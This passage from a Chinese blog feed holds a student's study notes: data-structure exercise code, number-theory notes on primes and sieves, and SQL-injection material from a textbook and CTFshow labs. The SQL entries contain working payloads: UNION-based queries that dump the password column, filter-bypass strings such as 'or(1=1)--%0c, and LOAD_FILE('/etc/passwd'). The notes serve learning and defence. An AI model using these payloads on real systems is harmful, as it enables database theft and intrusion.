class="hljs-keyword">if</span>(flag)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0 0&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>List L1,L2,add,mul;<br>L1 = <span class="hljs-built_in">Read</span>();<br>L2 = <span class="hljs-built_in">Read</span>();<br>add = <span class="hljs-built_in">addition</span>(L1,L2);<br>mul = <span class="hljs-built_in">multiplication</span>(L1,L2);<br><span class="hljs-built_in">Print</span>(mul);<br><span class="hljs-built_in">Print</span>(add);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure>        </div>      </div>    </div><p>0908<br><strong>NO3,<a href="https://pintia.cn/problem-sets/15/exam/problems/type/7?problemSetProblemId=711&page=0">树的同构</a></strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-32145da0" role="button" aria-expanded="false" aria-controls="collapse-32145da0">        <div class="fold-arrow">▶</div>同构。      </div>      <div class="fold-collapse collapse" id="collapse-32145da0">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> null -1</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span>&#123;<br><span class="hljs-type">char</span> data;    <span class="hljs-comment">// 存值 </span><br><span class="hljs-type">int</span> left;   <span class="hljs-comment">// 左子树的下标 </span><br><span class="hljs-type">int</span> right;  <span class="hljs-comment">// 右子树的下标 </span><br>&#125;T1[<span class="hljs-number">10</span>],T2[<span class="hljs-number">10</span>];<br><span class="hljs-comment">// 返回根结点 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode T[])</span></span>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> root = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> left,right;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">if</span>(!n)<br><span class="hljs-keyword">return</span> null;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>cin&gt;&gt;T[i].data&gt;&gt;left&gt;&gt;right;<br><span class="hljs-keyword">if</span>(left==<span class="hljs-string">&#x27;-&#x27;</span>)<br>T[i].left = null;<br><span class="hljs-keyword">else</span>&#123;<br>T[i].left = left-<span class="hljs-string">&#x27;0&#x27;</span>;<br>root -= T[i].left;<br>&#125;<br><span class="hljs-keyword">if</span>(right==<span class="hljs-string">&#x27;-&#x27;</span>)<br>T[i].right = null;<br><span class="hljs-keyword">else</span>&#123;<br>T[i].right = right-<span class="hljs-string">&#x27;0&#x27;</span>;<br>root -= T[i].right;<br>&#125;<br><span class="hljs-comment">// 0 累加到 n-1 </span><br>root +=i;<br>&#125;<br><span class="hljs-keyword">return</span> root;<br>&#125;<br><span class="hljs-comment">// 判断是否同构</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> R1,<span class="hljs-type">int</span> R2)</span></span>&#123;<br><span class="hljs-keyword">if</span>(R1 == null &amp;&amp; R2 == null)   <span class="hljs-comment">// 都为空 </span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">if</span>(R1 == null &amp;&amp; R2 != null || R1 != null &amp;&amp; R2 == null)    <span class="hljs-comment">// 一个为空，一个不为空</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span>(T1[R1].data != T2[R2].data)   <span class="hljs-comment">// 值不同</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span>((T1[R1].left != null &amp;&amp; T2[R2].left != null )&amp;&amp;(T1[T1[R1].left].data == T2[T2[R2].left].data))  <span class="hljs-comment">// 左儿子不为空且值相等</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">judge</span>(T1[R1].left,T2[R2].left) &amp;&amp; <span class="hljs-built_in">judge</span>(T1[R1].right,T2[R2].right);<br><span class="hljs-keyword">else</span>   <span class="hljs-comment">// 左儿子不为空且值不等  或者 某一个左儿子为空 </span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">judge</span>(T1[R1].right,T2[R2].left) &amp;&amp; <span class="hljs-built_in">judge</span>(T1[R1].left,T2[R2].right);<br>&#125; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> R1,R2;<br>R1 = <span class="hljs-built_in">create</span>(T1);<br>R2 = <span class="hljs-built_in">create</span>(T2);<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">judge</span>(R1,R2))<br>cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>;<br><span class="hljs-keyword">else</span><br>cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>感觉难度明显上升了~，已经听开小白专场了。。。</strong></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入理论</title>
    <link href="/dong.github/2024/09/03/sqlinjection3/"/>
    <url>/dong.github/2024/09/03/sqlinjection3/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>《SQL注入攻击与防御》Chap1</strong></p><span id="more"></span><h1 id="SQL注入综述"><a href="#SQL注入综述" class="headerlink" title="SQL注入综述"></a>SQL注入综述</h1><p><strong>SQL注入是影响企业运营最具破坏性的漏洞之一，它会泄露保存在应用程序数据库中的敏感信息。</strong><br><strong>定义：应用程序在向后台数据传递SQL查询时，如果为攻击者提供了影响改查询的能力，就会引发SQL注入。</strong><br><strong>外延：不只是一种会影响Web应用的漏洞，对于任何不可信源获取输入的代码来说，如果使用该输入来构造动态SQL语句，就很可能会遭到攻击。</strong><br><strong>典型SQL注入-服务器端的数据库，外延-JS服务器端，Android平台</strong></p><p><strong>历史：1998年，在一次报告中首次进入公众视野，自此SQL注入的防范成为了一个重要的安全研究方向。</strong></p><h1 id="前置："><a href="#前置：" class="headerlink" title="前置："></a>前置：</h1><h2 id="Web应用通用简单构建方式："><a href="#Web应用通用简单构建方式：" class="headerlink" title="Web应用通用简单构建方式："></a>Web应用通用简单构建方式：</h2><p><strong>不管是什么语言编写的Web应用，有一点相同；它们的交互性由数据库驱动。</strong></p><blockquote><ul><li><strong>数据库驱动的Web应用通常包括三层：</strong></li><li><strong>表示层—-Web浏览器</strong></li><li><strong>逻辑层—-PHP、.NET、ASP&amp;……</strong></li><li><strong>存储层—- MYSQL、Oracle等数据库管理系统</strong><br><img src="/dong.github/images/0903-1.jpg"><br><strong>三层架构中最基本的一条规则：表示层不与数据层通信</strong><br><strong>这个过程是如何在代码中实现？书上给出了一段代码：</strong><br><img src="/dong.github/images/0903-2.jpg"></li><li><strong>这段PHP代码简明展现了交互过程，即逻辑层代码构造SQL语句与存储层进行数据交接，再把数据变成好看的页面展示在浏览器</strong></li><li><strong>值得指出的是，实际开发中，mysql_query()早已弃用，而这种把SQL语句直接赋值给变量的做法也非常少见（要查的内容被写死），更常见的应用是构造查询类(Class)，使用代码拼接出sql语句，进而实现链式查询（框架的实现原理）</strong></li><li><strong>这里用到了计算机科学中常用的方法，抽象，构建一个抽象层，用同样的办法（类）应对各种不同的实际情况，大大提高了效率</strong></li></ul></blockquote><h1 id="注入成因："><a href="#注入成因：" class="headerlink" title="注入成因："></a>注入成因：</h1><blockquote><ul><li><strong>如果Web应用开发人员无法确保在将从Web表单，cookie及输入参数等收到的值传递给SQL查询之前以及对其进行验证，通常会出现SQL注入漏洞。</strong></li><li><strong>如果攻击者能够控制发送给SQL查询的输入，并且能够操纵该输入并将其解析为代码而非数据，那么攻击者很可能有能力在后台数据库执行代&gt; 码。</strong></li></ul></blockquote><p><strong>上述成因恰好印证了在CTF sql注入的实际应用：时间盲注、布尔盲注、联合查询盲注等等，都是在寻找各种办法操纵输入，让其变得可执行，可观测。</strong></p><h2 id="构造动态字符串"><a href="#构造动态字符串" class="headerlink" title="构造动态字符串"></a>构造动态字符串</h2><p><strong>开发人员在运行过程中需要根据不同的查询标准来决定提取什么字段，或者根据不同条件来选择不同表，动态构造SQL语句非常有用。</strong><br>动态构造举例：<br><img src="/dong.github/images/0903-3.jpg"></p><h3 id="转义字符处理不当"><a href="#转义字符处理不当" class="headerlink" title="转义字符处理不当"></a>转义字符处理不当</h3><p><strong>单引号被提前闭合，最常见的注入题目</strong><br><strong>单引号不是唯一的转义字符，因数据库管理软件不同而不同，因此熟悉数据库各种特性非常重要</strong></p><h3 id="类型处理不当"><a href="#类型处理不当" class="headerlink" title="类型处理不当"></a>类型处理不当</h3><p><strong>Web开发人员的思维模式：单引号字符是字符串的分隔符，还会被当作代码与数据的分隔线，但是，处理数字数据时，不需要使用单引号，否则数据也被当作了字符串。</strong><br>看条语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">SQL</span> <span class="hljs-operator">=</span> &quot;SELECT * FROM table WHERE field = $_GET[&quot;userid&quot;]&quot;<br></code></pre></td></tr></table></figure><p><strong>!!!攻击者的输入直接被解析成了SQL语法，攻击者没必要使用单引号字符来转义查询，这时候过滤就失效了。</strong><br><strong>想到了CTFShow无过滤注入的最后一题，如果用户拥有FILE权限（一种管理员权限，root用户默认有），</strong><br><strong>MySQL的内置命令：select into outfile，直接创建了系统文件并进行写操作，逆天。</strong><br><strong>select LOAD_FILE(‘&#x2F;etc&#x2F;passwd’)</strong></p><h3 id="查询语句组装不当"><a href="#查询语句组装不当" class="headerlink" title="查询语句组装不当"></a>查询语句组装不当</h3><p><strong>开发者想好要查的东西（有应用接口产生的get参数）被替换了。</strong></p><h3 id="错误处理不当"><a href="#错误处理不当" class="headerlink" title="错误处理不当"></a>错误处理不当</h3><p><strong>出错了，并告诉怎么错。为攻击者提供了重要攻击线索</strong></p><h3 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h3><p><strong>大型Web开发的问题，有些开发人员严格对输入进行了验证，有些却不然，很难保证项目中每个人都遵循相同的标准。总会出现漏网之鱼</strong></p><h3 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h3><blockquote><ul><li><strong>理想情况下，应用应该使用不同数据库用户来执行SQL命令，类似操作系统的权限控制，即使攻击者成功将代码注入，为其分配的权限也是最低的，重要的数据都没有查看权限。</strong></li><li><strong>实际情况是多数应用没有实现像操作系统那样很好的权限分离，因此攻击者可以访问到数据库中的所有数据，甚至在数据库间跳转</strong></li><li><strong>实际情况还有就是开发人员在写代码时通常使用某个内置的权限账户来连接数据库，功能强大的内置用户可以执行很多与程序需求无关的操作。</strong></li><li><strong>要实现上述目标，攻击者首先需要了解可以获取哪些附加内容、数据库有哪些、字段有什么，这就需要访问数据库的元数据-数据库内部包含的数据。</strong><br><strong>这也就解释了SQL注入的第一步总是在查INFORMATION_SCHEMA这个虚拟数据库，因为元数据都在这里。</strong></li></ul></blockquote><h1 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h1><p><img src="/dong.github/images/0903.4.jpg"></p><h1 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A:"></a>Q&amp;A:</h1><p><strong>Q:找到一个网站然后对其注入单引号(‘)，会被起诉吗？</strong><br><strong>A:会，这属于未授权的渗透测试行为，简称黑客行为，受法律制裁。</strong></p><p><strong>Q:是否可以认为禁止输入单引号，就可以避免SQL注入？</strong><br><strong>A:否，很多方法可对单引号进行编码绕过，且单引号不是唯一可以用于注入的字符</strong></p><p><strong>Q:如何在开发中避免出现SQL注入漏洞？</strong><br><strong>A:使用多种语言也不可避免，只要参数未经验证。而参数化查询和绑定变量是很好的办法</strong></p><p><strong>PS：本文中提到的参数化查询，绑定变量，链式查询和构造查询类等内容，详细见php开发部分笔记。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入-有过滤注入</title>
    <link href="/dong.github/2024/09/03/sqlinjection2/"/>
    <url>/dong.github/2024/09/03/sqlinjection2/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>SQL无过滤注入CTFshow176-182</strong></p><span id="more"></span><h1 id="过滤位置"><a href="#过滤位置" class="headerlink" title="过滤位置"></a>过滤位置</h1><p><img src="/dong.github/images/0903.png" alt="alt text"><br><strong>这里过滤的不是整条语句的内容，而是由用户传入的参数部分</strong></p><h2 id="回顾-基本查找流程"><a href="#回顾-基本查找流程" class="headerlink" title="回顾-基本查找流程"></a>回顾-基本查找流程</h2><p><strong>Union Select字段个数-&gt;库名-&gt;表名-&gt;列名-&gt;查找</strong><br><strong>字段个数枚举找出或使用order by</strong><br><strong>库名，列名，表名是在information_schema中找</strong><br><strong>目标数据是在目标库中找</strong><br><strong>注意这里的group_concat操作，以及语句的嵌套，无新意，提高一点点查找效率</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union Select 1,(Select group_concat(schema_name) from information_schema.schemata),database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">Select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">Select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;ctfshow_web&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union Select 1,(Select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27; and table_name=&#x27;</span>ctfshow_user<span class="hljs-string">&#x27;),3 %23</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">Select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">Select</span> group_concat(password) <span class="hljs-keyword">from</span> ctfshow_web.ctfshow_user),<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="题目顺序总结"><a href="#题目顺序总结" class="headerlink" title="题目顺序总结"></a>题目顺序总结</h2><blockquote><ul><li>大写过滤</li><li>空格过滤</li><li>&#x2F;**&#x2F;过滤</li><li>%0a过滤</li><li>%0b过滤</li><li>%09过滤</li><li>%23过滤</li><li>%0c过滤</li><li>%0e过滤</li></ul></blockquote><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p><strong>通解：围绕万能密码：’or 1&#x3D;1+注释符 的各种变体展开</strong><br><strong>‘or(1&#x3D;1)–%0c</strong><br><strong>‘or’1’&#x3D;’1’–%0c</strong><br><strong>两种基本通用。</strong></p><h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><h3 id="关于注释符"><a href="#关于注释符" class="headerlink" title="关于注释符"></a>关于注释符</h3><h4 id="–注释"><a href="#–注释" class="headerlink" title="–注释"></a><strong>–注释</strong></h4><p><strong>定义：在SQL语言中，使用“–”符号开始的行内注释。</strong><br><strong>特点：</strong><br><strong>注释内容从“–”开始到行尾结束。</strong><br><strong>需要在“–”后</strong>紧跟<strong>一个空格或制表符等。</strong></p><h4 id="注释"><a href="#注释" class="headerlink" title="#注释"></a><strong>#注释</strong></h4><p><strong>定义：使用#符号开始的单行注释。</strong><br><strong>特点：</strong><br><strong>后面的所有内容直到行尾都被视为注释。</strong></p><h3 id="关于url编码"><a href="#关于url编码" class="headerlink" title="关于url编码"></a>关于url编码</h3><p><strong>SQL注入过程是会经过URL编码的，****因此，#注释和–注释的注入方法是有区别的，</strong><br><strong>区别在于#需要经过url编码为%23</strong>，**–注释后边紧跟的字符也需要经过url编码。**</p><h3 id="关于优先级"><a href="#关于优先级" class="headerlink" title="关于优先级"></a>关于优先级</h3><p><strong>表格省，划重点-AND &gt; OR</strong></p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息安全数学基础-第一章-整除</title>
    <link href="/dong.github/2024/09/02/secmath0/"/>
    <url>/dong.github/2024/09/02/secmath0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>这一章讲了初等数论的整除部分，这篇文章是对这章内容的重点归纳和拓展</strong></p><span id="more"></span><p><strong>这章内容解决了以前在算法编程中遇到的几个问题，当时只是苦思冥想，不知其所以然。通过这次对理论的学习忽然理解了算法背后的设计思想，写下这篇博客，记录一下灵感乍现的惊喜。</strong></p><blockquote><ul><li><strong>判断素数问题，定理1.4对应到了O(√n)算法优化方法的证明</strong></li><li><strong>素数筛的两种方法：埃氏筛和欧拉筛，刚好对应了两种素数不可穷举的证明思想</strong></li><li><strong>辗转相除法及其证明</strong></li><li><strong>贝祖定理，扩展欧几里得算法的应用</strong></li><li><strong>素数的性质，最大公因数和最小公倍数</strong></li></ul></blockquote><h1 id="重要定理及证明-素数部分"><a href="#重要定理及证明-素数部分" class="headerlink" title="重要定理及证明(素数部分)"></a>重要定理及证明(素数部分)</h1><h2 id="定理1-3："><a href="#定理1-3：" class="headerlink" title="定理1.3："></a>定理1.3：</h2><blockquote><ul><li><strong>设a,b,c!&#x3D;0是三个正整数。若c|a，c|b，则对任意整数s,t有</strong></li><li><strong>c | s<em>a+t</em>b</strong></li></ul></blockquote><p><strong>这条定理通过整除定义证明即可。但是这条定理也值得记下，它提供了后边欧几里得除法的证明方式，而扩展欧几里得除法提供了求逆元的方法，这又是后续RSA加密算法的关键环节，所以说这条定理差不多算是大楼的第一块砖了，基础却重要。</strong></p><h2 id="定理1-4"><a href="#定理1-4" class="headerlink" title="定理1.4"></a>定理1.4</h2><blockquote><ul><li><strong>设n是一个正合数，p是n的一个大于1的最小正因数，则p一定是素数，且p小于等于√n。</strong><br> <strong>这条定理应该是整除部分最重要的之一了。</strong></li><li><strong>空口无凭，举个实际应用的例子-判断一个数是否是素数：</strong><br><b><font color="#b30b00">“非正式地说，这条定理说明了两点：素数可以视为合数的“组成部分”，且这一“组成成分”中必然有一部分小于√n”</font></b></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_prime</span>(<span class="hljs-params">n</span>):  <br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">1</span>:  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">3</span>:  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <br>    <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> n % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <br>    i = <span class="hljs-number">5</span>  <br>    <span class="hljs-keyword">while</span> i * i &lt;= n:  <br>        <span class="hljs-keyword">if</span> n % i == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> n % (i + <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>:  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <br>        i += <span class="hljs-number">6</span>  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p><strong>为什么只枚举到√n?，这里就用到了定理1.4，大大提高了算法时间复杂度。</strong><br><strong>值得说明的是，对于判断素数问题，O(√n)即是速度瓶颈，也就是说这基本上是最快的方法了。</strong></p><h2 id="定理1-5"><a href="#定理1-5" class="headerlink" title="定理1.5"></a>定理1.5</h2><blockquote><p><strong>素数有无穷多个</strong><br><strong>课上讲了两种证明方法，思考发现，两种证明思想刚刚好对应了两种编程算法，这里先介绍证明方法：</strong></p></blockquote><h3 id="证明A："><a href="#证明A：" class="headerlink" title="证明A："></a>证明A：</h3><p><img src="/dong.github/images/0902-3.png"></p><h3 id="证明B"><a href="#证明B" class="headerlink" title="证明B:"></a>证明B:</h3><p><img src="/dong.github/images/0902-2.jpg"></p><h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h3><p><strong>对于寻找范围内所有素数的问题，网上资料会说：欧拉筛是埃氏筛法的优化、欧拉筛和埃氏筛的本质都一样：“素数的倍数不是素数。”、欧拉筛避免了埃氏筛中重复筛选的问题、等等.</strong></p><p><strong>这些说法都不错，但是当我们学过算法的数学理论，不难发现这两种算法其实是两种不同证明思想的体现，而不是简单的算法优化与继承。</strong></p><p><strong>埃氏筛法对应证法A，欧拉筛对应证法B</strong></p><h4 id="Eraosthenes（埃拉托斯尼筛法）埃氏筛法"><a href="#Eraosthenes（埃拉托斯尼筛法）埃氏筛法" class="headerlink" title="Eraosthenes（埃拉托斯尼筛法）埃氏筛法"></a>Eraosthenes（埃拉托斯尼筛法）埃氏筛法</h4><p><strong>时间复杂度O（nloglogn）</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">2e6</span><span class="hljs-number">+6</span>;<br><span class="hljs-type">bool</span> isprime[maxn];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">seive</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">memset</span>(isprime,<span class="hljs-literal">true</span>,<span class="hljs-built_in">sizeof</span>(isprime));<br>    isprime[<span class="hljs-number">0</span>]=isprime[<span class="hljs-number">1</span>]=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=maxn;i++)&#123;<br>        <span class="hljs-keyword">if</span> (isprime[i]&amp;&amp;i&lt;<span class="hljs-built_in">sqrt</span>(maxn)) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i * i; j &lt;= maxn; j += i) &#123;<span class="hljs-comment">//枚举倍数并筛去</span><br>                isprime[j] = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Attention：</span><br><span class="hljs-comment">//1.Q:如何理解它与证明A的联系？</span><br><span class="hljs-comment">//  A:反证存在无限个素数的过程实际上提供了一种寻找素数的方法，进而完成素数的筛选。</span><br><span class="hljs-comment">//2.Q:如何理解并证明埃氏筛重复筛选的问题？</span><br><span class="hljs-comment">//  A:例如：对于6就有重复的筛选-2*3和3*2</span><br><span class="hljs-comment">//3.Q:为什么j要从i平方开始枚举，如何证明这样做的正确性?</span><br><span class="hljs-comment">//4.Q:i可以枚举到√maxn就停止吗？</span><br></code></pre></td></tr></table></figure><h5 id="埃氏筛法的相关证明"><a href="#埃氏筛法的相关证明" class="headerlink" title="埃氏筛法的相关证明"></a>埃氏筛法的相关证明</h5><h6 id="证明从i平方开始枚举可行"><a href="#证明从i平方开始枚举可行" class="headerlink" title="证明从i平方开始枚举可行"></a>证明从i平方开始枚举可行</h6><p><img src="/dong.github/images/0915.png"></p><h6 id="证明埃氏筛正确，并证明它无法避免重复筛选"><a href="#证明埃氏筛正确，并证明它无法避免重复筛选" class="headerlink" title="证明埃氏筛正确，并证明它无法避免重复筛选"></a>证明埃氏筛正确，并证明它无法避免重复筛选</h6><p>假设存在一个数n，它是i的倍数但大于i^2，且n还没有被任何小于i的质数筛去。那么n可以表示为n &#x3D; i * k，其中k &gt; i。</p><ul><li><p>如果k是质数:<br>那么k一定大于i（因为k是n的因子且n &gt; i^2），那么k*i &gt; i^2，那么当前i一定可以筛掉这个n，合理。</p></li><li><p>如果k是合数:<br>那么根据定理1.23（算术基本定理），任意整数可以唯一的表示成:</p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><msup><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msup><mi>p</mi><msup><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub></msup><mi>p</mi><msup><mn>3</mn><msub><mi>a</mi><mn>3</mn></msub></msup><mo>⋯</mo><msubsup><mi>p</mi><mi>k</mi><msub><mi>a</mi><mi>k</mi></msub></msubsup><mo separator="true">,</mo><msub><mi>p</mi><mi>i</mi></msub><mo>&lt;</mo><msub><mi>p</mi><mi>j</mi></msub><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">n=p1^{a_1} p2^ {a_2}p3^ {a_3}\cdots p_k^{a_k},p_i &lt; p_j,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0534em;vertical-align:-0.3013em;"></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord 